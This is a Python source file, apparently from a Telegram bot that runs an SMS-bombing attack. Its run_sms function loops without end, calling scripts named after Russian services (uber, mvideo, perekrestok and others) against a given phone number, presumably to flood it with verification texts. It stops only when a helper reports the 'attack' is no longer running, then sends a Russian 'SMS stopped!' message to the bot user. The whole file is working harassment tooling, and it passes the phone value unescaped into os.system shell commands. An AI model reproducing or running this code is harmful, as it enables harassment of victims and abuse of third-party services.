import requests

import utilities

import telebot

from threading import Thread

import time

import config

import os
import sys


def run_sms(phone, userid):

    while True:
        
        os.system("python3 uber.py " + phone)

        time.sleep(2)

        os.system("python3 aptekaapril.py " + phone)

        time.sleep(2)

        os.system("python3 citymobil.py " + phone)

        time.sleep(2)

        os.system("python3 kari.py " + phone)

        time.sleep(2)

        os.system("python3 mvideo.py " + phone)

        time.sleep(2)

        os.system("python3 perekrestok.py " + phone)

        time.sleep(2)

        os.system("python3 sravni.py " + phone)

        if not utilities.is_attack_running(userid):
            bot = telebot.TeleBot(config.bot_token)
            bot.send_message(userid, "СМС остановлены!")
            return 0
